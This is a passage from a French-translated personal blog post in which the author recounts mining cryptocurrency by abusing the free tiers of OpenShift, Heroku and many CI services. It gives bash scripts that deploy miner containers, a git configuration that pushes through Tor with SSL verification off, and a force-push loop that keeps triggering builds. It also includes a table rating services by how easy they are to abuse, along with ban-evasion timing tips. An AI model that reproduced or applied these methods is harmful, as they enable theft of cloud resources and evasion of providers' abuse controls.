<span class=hljs-comment># oc-docker-login || exit 1</span>
oc-build-mine || <span class=hljs-built_in>exit</span> 1

<span class=hljs-comment>## create dc config</span>
<span class=hljs-built_in>export</span> OC_TEMPLATE_TYPE=mine
oc-box-template || <span class=hljs-built_in>exit</span> 1
rtr=0
<span class=hljs-keyword>while</span> [ <span class=hljs-variable>$rtr</span> -lt 10 ]; <span class=hljs-keyword>do</span>
  oc rollout latest <span class=hljs-variable>$OC_APP</span> && <span class=hljs-built_in>break</span>
  rtr=$((rtr+<span class=hljs-number>1</span>))
  <span class=hljs-built_in>read</span> -t 1
<span class=hljs-keyword>done</span>
<span class=hljs-built_in>exit</span>
<span class=hljs-comment>## builds</span>
bash -x oc-build-build || <span class=hljs-built_in>exit</span> 1
bash -x oc-build-template || <span class=hljs-built_in>exit</span> 1
oc start-build <span class=hljs-variable>$OC_APP</span> || <span class=hljs-built_in>exit</span> 1

accounts=<span class=hljs-variable>${ACCOUNTS_DIR:-accounts_queue}</span>
<span class=hljs-built_in>mv</span> <span class=hljs-variable>$accounts</span>/<span class=hljs-variable>${OC_USR}</span>{\.this,\.$(<span class=hljs-built_in>date</span> +%s)}</code></pre><p>En pseudo-code :<ul><li><p>créer le projet<li><p>créer l'application sans image<li><p>construire le conteneur minier<li><p>déployer le conteneur avec une configuration de déploiement (abstraction kubernetes)<li><p>déployer le déploiement</ul><p>Les<code>build-build</code> les scripts ont plutôt créé un<em> construire</em> conteneur qui exploiterait pendant quelques heures à la fois. Les builds et les pods normaux ont des ressources distinctes dans openshift, nous les avons donc exploités tous les deux. Openshift a été dans l'ensemble une mauvaise expérience car il est passé sur 4 versions différentes (peut-être plus, j'ai arrêté de suivre après un certain temps) et chacune d'entre elles nécessitait des modifications des configurations, elles n'avaient pas de chemin de mise à niveau et tout a été rapidement itéré, et c'était courant pour que les builds/pods se bloquent et ne soient pas ramassés par les ordures... ils exécutaient généralement des redémarrages manuels de temps en temps, peut-être que kubernetes était juste bogué :)<p>La configuration de Heroku était un peu plus simple (elle n'implique pas kubernetes). Mis à part la construction du conteneur, qui était similaire à celle d'openshift, le reste n'était que deux commandes cli<pre><code class="bash hljs">heroku config:<span class=hljs-built_in>set</span> HRK_APP=<span class=hljs-variable>$HRK_APP</span> -a <span class=hljs-variable>$HRK_APP</span>
heroku container:release -a <span class=hljs-variable>$HRK_APP</span> <span class=hljs-variable>$TYPE</span></code></pre><p>Le conteneur a été directement poussé avec docker vers le registre heroku.<sup id=fnref:herokucontainers><a class=fnref href=#fndef:herokucontainers>[12]</a></sup> La friction avec heroku (dont le niveau gratuit est toujours à la hauteur au moment de la rédaction) est que les dynos ne peuvent fonctionner que 22 jours par mois, ils nécessitaient donc une gestion manuelle chaque mois, encore une fois maladroite et ennuyeuse. Ils ont exécuté des vagues d'interdiction au début, puis ils ont désactivé les inscriptions via TOR, je suis presque sûr d'en être la cause.<h3 id=ci_containers_or_vms><a class=header-anchor href=#ci_containers_or_vms> Conteneurs CI ou VM</a></h3><p>Ce sont les cibles les plus synergiques pour notre compte-gouttes. Il y a beaucoup de<a href=https://en.wikipedia.org/wiki/Continuous_integration> CI</a> entreprises, dont beaucoup brûlent l'argent des investisseurs en offrant des niveaux gratuits dans l'espoir de gagner des parts de marché dans le secteur des infrastructures technologiques.<p>Tous ces services offrent des ressources différentes, ont des exigences de configuration différentes et s'exécutent dans des environnements différents. Je n'ai jamais envisagé d'automatiser l'enregistrement de compte parce que ce genre de choses est horrible à programmer, j'essaie de les éviter tout le temps, alors j'ai juste enduré les enregistrements manuels pendant un certain temps car j'étais curieux de savoir quel type de réponse anti-spam j'obtiendrais (et comme c'est différent des autres !). Vous pouvez deviner certaines choses sur la gestion d'une entreprise à partir de la façon dont elle gère le spam :<ul><li><p>Effectue-t-il des vagues d'interdiction ? Ensuite, ils ont des politiques non strictes, les problèmes sont traités manuellement et au cas par cas<li><p>Nécessite-t-il une vérification par téléphone ? Ils ont déjà été maltraités dans le passé<li><p>Répondent-ils à une utilisation intensive des ressources ? Ils fonctionnent avec un budget serré<li><p>Appliquent-ils des restrictions de compte ou des interdictions fantômes ? S'ils shadow ban, ils ont des administrateurs système méchants.</ul><p>Il y a aussi une question philosophique : si un service vous permet d'abuser de son système pendant longtemps, cela signifie-t-il qu'il dispose d'une infrastructure haut de gamme capable de gérer la charge, ou simplement d'un mauvais contrôle sur son système ? Et vous devez tenir compte de l'équilibre entre accessibilité et sécurité, un système trop sécurisé peut réduire la rétention des utilisateurs.<p>Voici un tableau montrant certains services sur lesquels j'ai déployé :<table><tbody><tr class="header headerLastRow"><th style=text-align:center>ci<th style=text-align:center>configuration<th style=text-align:center>performance<th style=text-align:center>ban-marteau<tr><td style=text-align:center>Bitrise<td style=color:red;text-align:center>mauvais<td style=color:#ff0;text-align:center>moyen<td style=color:#ff0;text-align:center>moyen<tr><td style=text-align:center>Travis<td style=color:green;text-align:center>bon<td style=color:#ff0;text-align:center>moyen<td style=color:green;text-align:center>bon<tr><td style=text-align:center>Codeship<td style=color:#ff0;text-align:center>moyen<td style=color:red;text-align:center>mauvais<td style=color:#ff0;text-align:center>moyen<tr><td style=text-align:center>Gitlab<td style=color:#ff0;text-align:center>moyen<td style=color:green;text-align:center>bon<td style=color:green;text-align:center>bon<tr><td style=text-align:center>Circleci<td style=color:red;text-align:center>mauvais<td style=color:green;text-align:center>bon<td style=color:#ff0;text-align:center>moyen<tr><td style=text-align:center>Sémaphore<td style=color:green;text-align:center>bon<td style=color:green;text-align:center>bon<td style=color:#ff0;text-align:center>moyen<tr><td style=text-align:center>Docker<td style=color:#ff0;text-align:center>moyen<td style=color:#ff0;text-align:center>moyen<td style=color:green;text-align:center>bon<tr><td style=text-align:center>Quai<td style=color:green;text-align:center>bon<td style=color:#ff0;text-align:center>moyen<td style=color:#ff0;text-align:center>moyen<tr><td style=text-align:center>Codefresh<td style=color:red;text-align:center>mauvais<td style=color:green;text-align:center>bon<td style=color:#ff0;text-align:center>moyen<tr><td style=text-align:center>Wercker<td style=color:#ff0;text-align:center>moyen<td style=color:#ff0;text-align:center>moyen<td style=color:red;text-align:center>mauvais<tr><td style=text-align:center>Azure-pipelines<td style=color:#ff0;text-align:center>moyen<td style=color:#ff0;text-align:center>moyen<td style=color:red;text-align:center>mauvais<tr><td style=text-align:center>php continu<td style=color:red;text-align:center>mauvais<td style=color:#ff0;text-align:center>moyen<td style=color:#ff0;text-align:center>moyen<tr><td style=text-align:center>copain<td style=color:red;text-align:center>mauvais<td style=color:red;text-align:center>mauvais<td style=color:red;text-align:center>mauvais<tr><td style=text-align:center>Drone<td style=color:red;text-align:center>mauvais<td style=color:green;text-align:center>bon<td style=color:red;text-align:center>mauvais<tr><td style=text-align:center>Appvoyeur<td style=color:red;text-align:center>mauvais<td style=color:#ff0;text-align:center>moyen<td style=color:red;text-align:center>mauvais<tr><td style=text-align:center>Ne jamais coder<td style=color:red;text-align:center>mauvais<td style=color:green;text-align:center>bon<td style=color:#ff0;text-align:center>moyen<tr><td style=text-align:center>Zeist/vercel<td style=color:red;text-align:center>mauvais<td style=color:green;text-align:center>bon<td style=color:red;text-align:center>mauvais</table><p>Dans ce contexte, un<span style=color:green> bon</span> configuration signifie qu'il n'a pas fallu beaucoup de temps pour configurer un<code>ci</code> travail pour le processus d'extraction (comme tous les services reposant sur un tableau de bord Web au lieu d'un fichier de points de référentiel étaient une corvée), un<span style=color:red> mauvais</span><code>ban-hammer</code> signifie qu'il était difficile de s'inscrire au service, ou que les comptes seraient bannis de manière plus agressive.<p><a href=https://web.archive.org/web/20210222050951/https://www.bitrise.io/> Bitrise</a> nécessite de configurer un projet, d'en déduire l'environnement, l'architecture cible, le processus d'exécution et d'autres choses, cela prenait beaucoup de temps pour configurer un build, il a donc obtenu une mauvaise note dans la configuration.<a href=https://web.archive.org/web/20210310010750/https://continuousphp.com/> php continu</a>, <a href=https://web.archive.org/web/20210322133805/https://buddy.works/> copain</a> , [Codefresh] comportait également de nombreuses étapes de configuration manuelles non déclaratives.<p>Des services comme [Azure-pipelines],<a href=https://web.archive.org/web/20210308202144/https://app.wercker.com/> Wercker</a>, <a href=https://web.archive.org/web/20210322133805/https://buddy.works/> copain</a> applique des interdictions d'ombre sur les comptes, les interdictions d'ombre sont mauvaises, car elles vous laissent deviner s'il y a un problème avec votre configuration ou non. Avec certains services, vous pouvez deviner la raison de l'interdiction (à peu près votre construction a pris trop de temps, ou vous avez construit trop de fois sur une courte période), pour d'autres comme [Azure-pipelines] je suppose qu'ils ont appliqué une sorte d'empreinte digitale aux référentiels d'utilisateurs alors que les interdictions arrivaient même sans aucun abus de ressources, azur et vercel également restreints<code>DNS</code> l'accès dans les machines de construction publiques, c'était donc une friction supplémentaire qui devait être surmontée avec un tunnel ad hoc.<p><a href=https://web.archive.org/web/20210327045555/https://cloud.drone.io/welcome> Drone</a> a donné accès à un processeur entier de 16+ cœurs mais a fini par être interdit après 2 versions<sup id=fnref:saddrone><a class=fnref href=#fndef:saddrone>[13]</a></sup>. <a href=https://web.archive.org/web/20210322100629/https://www.cloudbees.com/products/codeship> Codeship</a> donne également accès à de puissants hôtes de construction et n'interdit pas de manière aussi agressive que le drone.<p>Mes services préférés non pas pour la rentabilité mais pour la facilité et la commodité (également avec d'autres projets) étaient<a href=https://web.archive.org/web/20210324163536/https://travis-ci.org/> Travis</a>, <a href=https://web.archive.org/web/20210308041527/https://semaphoreci.com/> Sémaphore</a> et<a href=https://web.archive.org/web/20210322105637/https://hub.docker.com/> Docker-hub</a> . Travis est comme le CI standard et est très flexible, Sémaphore est le seul<code>DSL</code> pour<code>CI</code> qui avait l'air accessible et bien au lieu d'une simple séquence sans fin de cases à cocher spaghettifiées comme d'autres interfaces utilisateur, et Docker juste pour la simplicité de mapper les fichiers docker aux builds.<h3 id=builds_configs><a class=header-anchor href=#builds_configs> Construire des configurations</a></h3><p>Les builds ont été déclenchés soit par des tâches cron proposées par des services Web, soit par des commits git. Vous deviez donc garder une trace d'une litière de jetons d'accès ou de clés ssh pour gérer tous les commits git. Il était également important de ne pas trop spammer les commits et d'utiliser des proxys lors de la diffusion vers les référentiels en configurant git :<pre><code class="toml hljs"><span class=hljs-section>[http]</span>
        <span class=hljs-attr>proxy</span> = socks5://<span class=hljs-number>127.0</span>.<span class=hljs-number>0.1</span>:<span class=hljs-number>9050</span>
        <span class=hljs-attr>sslverify</span> = <span class=hljs-literal>false</span>
<span class=hljs-section>[https]</span>
        <span class=hljs-attr>proxy</span> = socks5://<span class=hljs-number>127.0</span>.<span class=hljs-number>0.1</span>:<span class=hljs-number>9050</span>
        <span class=hljs-attr>sslverify</span> = <span class=hljs-literal>false</span>
<span class=hljs-section>[url "https://"]</span>
    <span class=hljs-attr>insteadOf</span> = git://</code></pre><p>En utilisant les services d'hébergement git, github a été le plus complet sur les interdictions, mais ils n'ont été exécutés que sur les rapports d'abus par les administrateurs des services ci, gitlab a exécuté une vague d'interdiction une fois, lorsque j'ai essayé de renouveler l'essai de CI (imprudemment). Je n'ai jamais reçu de ban pour un compte bitbucket. Pour (forcer) pousser les commits git, nous avons une longue boucle qui re-marque le dépôt git :<pre><code class="bash hljs"><span class=hljs-keyword>while</span> :; <span class=hljs-keyword>do</span>
    repos_count=$(<span class=hljs-built_in>ls</span> -ld <span class=hljs-variable>${repos}</span>/* | grep -c ^d)
    repos_ival=$(((RANDOM%variance+delay)/repos_count))
    <span class=hljs-keyword>for</span> r <span class=hljs-keyword>in</span> <span class=hljs-variable>$repos</span>/*; <span class=hljs-keyword>do</span>
        <span class=hljs-built_in>cd</span> <span class=hljs-string>"<span class=hljs-variable>$r</span>"</span>
        git fetch --all
        tagger
        <span class=hljs-built_in>echo</span> -e <span class=hljs-string>"\e[32m"</span><span class=hljs-string>"sleeping for <span class=hljs-variable>$repos_ival</span> since <span class=hljs-subst>$(date +%H:%M:%S\ %b/%d)</span>"</span><span class=hljs-string>"\e[0m"</span>
        <span class=hljs-built_in>sleep</span> <span class=hljs-variable>$repos_ival</span>
    <span class=hljs-keyword>done</span>
    <span class=hljs-built_in>sleep</span> 1
<span class=hljs-keyword>done</span></code></pre><p>Il est possible que la force de pousser de cette façon ne soit pas quelque chose que github aime beaucoup et ait pu être une cause de signalement de comptes. La fonction de tagueur chargée de forcer un autre commit, utilise un site Web (que vous pouvez rechercher assez facilement) qui donne des commits aléatoires. Je ne sais pas à quel point cela aide, car le contenu lui-même des commits est évidemment suspect pour mon cas. Et cela m'a aussi mordu au cul une fois, puisque les commits renvoyés par cette commande peuvent inclure des jurons, l'un de mes commits a été récupéré par un bot twitter qui suit les commits git avec des jurons ! J'ai ajouté une liste noire pour les gros mots après l'incident.<p>Je n'ai pas vraiment exploré les commits git obscurcis et les référentiels git obscurcis. Le seul cas où j'utilisais un référentiel plus élaboré était avec Bitrise car vous ne pouviez pas configurer une version si le système ne reconnaissait pas un environnement (comme les applications mobiles), mais même alors il n'y avait pas de rotation et c'était toujours la même chose référentiel, assez facile à repérer.<p>Globalement, si je devais tracer une courbe en cloche autour du moment optimal pour le mien<em> sans pour autant</em>obtenir des comptes bannis, sur tous les services testés, se ferait avec un centre d'une durée de construction d'environ 1 heure, une fois par jour. Pour les cœurs de processeur, à l'exception de quelques menteurs (comme un drone), la plupart des services s'attendent à ce que vous utilisiez la totalité des ressources qui vous sont données, car les versions sont exécutées dans des machines virtuelles ou des conteneurs avec des ressources limitées ... et la compilation est généralement une tâche qui sature le processeur, il n'a donc pas de pertinence statistique. Intuitivement, une version par jour est ce que le développeur moyen ferait, vous devez donc vous attendre à des drapeaux levés si vous vous éloignez de la moyenne, et pousser à l'abus ne se termine jamais bien.<h2 id=conclusions><a class=header-anchor href=#conclusions> Conclusion</a></h2><p>Cela en valait-il la peine? Les parties de mise en réseau étaient vraiment intéressantes, la gestion des enregistrements de comptes était évidemment la pire partie, personne n'aime cliquer sur des e-mails de confirmation sans fin et répéter des procédures d'interface utilisateur abrutissantes, après tout. Écrire un logiciel d'automatisation du spam est également ennuyeux (parce que vous vous moquez principalement des API stupides), et avec cette hypothèse (et le fait que cela n'a jamais été quelque chose de grave), je n'y ai même jamais pensé. Était-ce rentable ? À son apogée, il atteignait quelque chose comme<code>300$</code> par mois, peut-être assez pour un vénézuélien, pas vraiment pour moi :)<p><table class=fndef id=fndef:adversary><tbody><tr><td class=fndef-backref><a href=#fnref:adversary>[1]</a><td class=fndef-content><em> l'administrateur système grincheux</em></table><table class=fndef id=fndef:infoproc><tbody><tr><td class=fndef-backref><a href=#fnref:infoproc>[2]</a><td class=fndef-content>même si cela briserait de nombreuses hypothèses de confidentialité, je suis sûr que la plupart d'entre eux jettent un coup d'œil à l'intérieur chaque fois qu'il y a un problème de titulaire, mais ce n'est un problème que pour les environnements d'exécution basés sur des conteneurs, alors que les machines virtuelles sont à peu près des boîtes noires.</table><table class=fndef id=fndef:monerominer><tbody><tr><td class=fndef-backref><a href=#fnref:monerominer>[3]</a><td class=fndef-content>le mineur intégré au nœud monero a travaillé pour le rendre plus convivial en arrière-plan, mais la distribution de xmrig n'a jamais été axée sur la convivialité en arrière-plan.</table><table class=fndef id=fndef:difficulty><tbody><tr><td class=fndef-backref><a href=#fnref:difficulty>[5]</a><td class=fndef-content>certains pools offrent des difficultés différentes sur différents ports de connexion et ont tendance à aligner la difficulté du travail sur les partages soumis par le mineur, mais la granularité du proxy était encore plus pratique, car elle empêchait le pool<a href=https://en.wikipedia.org/wiki/Vendor_lock-in> enfermer</a> (même si nous n'avons jamais vraiment changé de piscine).</table><table class=fndef id=fndef:configwatch><tbody><tr><td class=fndef-backref><a href=#fnref:configwatch>[4]</a><td class=fndef-content>ce n'était pas content quand la configuration est soudainement apparue et a disparu du système de fichiers</table><table class=fndef id=fndef:stratumprotocol><tbody><tr><td class=fndef-backref><a href=#fnref:stratumprotocol>[6]</a><td class=fndef-content>On ne parle pas du<a href=https://en.bitcoin.it/wiki/Stratum_mining_protocol> protocole de strate</a> puisque nous devons simplement nous occuper de tout ce qui est mis en œuvre dans<em> les deux</em> la piscine et le mineur... ce qui est généralement le strict minimum, et éventuellement avec des extensions non standard.</table><table class=fndef id=fndef:fullbash><tbody><tr><td class=fndef-backref><a href=#fnref:fullbash>[7]</a><td class=fndef-content>ne jamais aller à fond :)</table><table class=fndef id=fndef:memoryondemand><tbody><tr><td class=fndef-backref><a href=#fnref:memoryondemand>[8]</a><td class=fndef-content>Je n'ai pas exploré ce qui se passe lorsqu'un processus charge des fonctionnalités supplémentaires au moment de l'exécution, car le noyau rechercherait l'adresse dans la disposition de la mémoire de l'exécutable, qui accéderait au système de fichiers et provoquerait éventuellement un plantage.</table><table class=fndef id=fndef:freehostinglimits><tbody><tr><td class=fndef-backref><a href=#fnref:freehostinglimits>[9]</a><td class=fndef-content>Les limites sont arbitraires, le temps CPU est inférieur à une seconde, la mémoire est inférieure à 128M, les connexions sortantes sont bloquées.</table><table class=fndef id=fndef:cpanelssh><tbody><tr><td class=fndef-backref><a href=#fnref:cpanelssh>[10]</a><td class=fndef-content>avec un peu de patience, vous pouvez également exécuter une instance ssh complète sur un environnement amorcé autour de votre espace de compte cpanel,<em> sans pour autant</em> avoir accès au SSH intégré de cpanel qui a tendance à être désactivé par les fournisseurs d'hébergement.</table><table class=fndef id=fndef:openshift><tbody><tr><td class=fndef-backref><a href=#fnref:openshift>[11]</a><td class=fndef-content>openshift est passé d'un niveau gratuit d'un an à 3 mois à 1 mois, commençant à exiger une authentification par téléphone, je peux garantir que je n'étais pas le seul à abuser de leurs services.</table><table class=fndef id=fndef:herokucontainers><tbody><tr><td class=fndef-backref><a href=#fnref:herokucontainers>[12]</a><td class=fndef-content>Les conteneurs de niveau gratuit Heroku sont assez généreux en ressources, ils fournissent des processeurs 4c/8t (virtuels), beaucoup de RAM et un stockage important (qui n'est cependant pas persistant et rejeté lors de l'arrêt du dyno).</table><table class=fndef id=fndef:saddrone><tbody><tr><td class=fndef-backref><a href=#fnref:saddrone>[13]</a><td class=fndef-content>Ils ajoutent des règles d'enregistrement beaucoup plus strictes, après quelques interdictions, j'y ai peut-être contribué.</table><p><div id=post-tags-list>Mots-clés : <span class=post-tag><a href=https://www.unto.re/tag/crypto> cryptographie</a>, </span><span class=post-tag><a href=https://www.unto.re/tag/net> rapporter</a>, </span><span class=post-tag><a href=https://www.unto.re/tag/shell> coquille</a></span></div><div class=page-foot><div class=copyright>11 décembre 2022</div><script async crossorigin=anonymous issue-term=pathname label=Comment repo=untoreh/untoreh.github.io src=https://utteranc.es/client.js></script></div></div><div class=page__footer><footer><div class=page__footer-copyright>© untoreh - Propulsé par<a href=https://github.com/tlienart/Franklin.jl> Franklin</a></div><div class=page__footer-links>- <ul><li><a href=/fr/sitemapxml> Plan du site</a></li> | <li><a href=/fr/tag> Mots clés</a></li> | <li><a href=https://www.unto.re/tag/feed.xml> RSS</a></ul></div><ul class=author__wrap><li class="author__urls social-icons"><a rel="nofollow noopener noreferrer" title="Twitter link"href=https://twitter.com/untoreh><i class="fab fa-fw fa-twitter-square"aria-hidden=true></i></a><li class="author__urls social-icons"><a rel="nofollow noopener noreferrer" title="GitHub link"href=https://github.com/untoreh><i class="fab fa-fw fa-github"aria-hidden=true></i></a><li class="author__urls social-icons"><a href=mailto:contact@unto.re title=email><i class="fas fa-envelope"></i></a><li><script type=application/ld+json>{"potentialAction":{"query-input":"required maxlength=100 name=input","actionStatus":"https://schema.org/PotentialActionStatus","query":"required","@type":"SearchAction","target":{"uri":"","scheme":"https","userinfo":"","host":"www.unto.re","port":"","path":"/search","query":"q=%7Binput%7D","fragment":""}}}</script></ul></footer></div><script crossorigin=anonymous defer id=fa integrity=sha384-DJ25uNYET2XCl5ZF++U8eNxPWqcKohUUBUpKGlNLMchM7q4Wjg2CUpjHLaL8yYPH src=https://use.fontawesome.com/releases/v5.8.2/js/all.js></script><script src=/libs/colors.js></script><script src=/libs/menu.js></script><script defer src=/libs/lunr/lunr.min.js></script>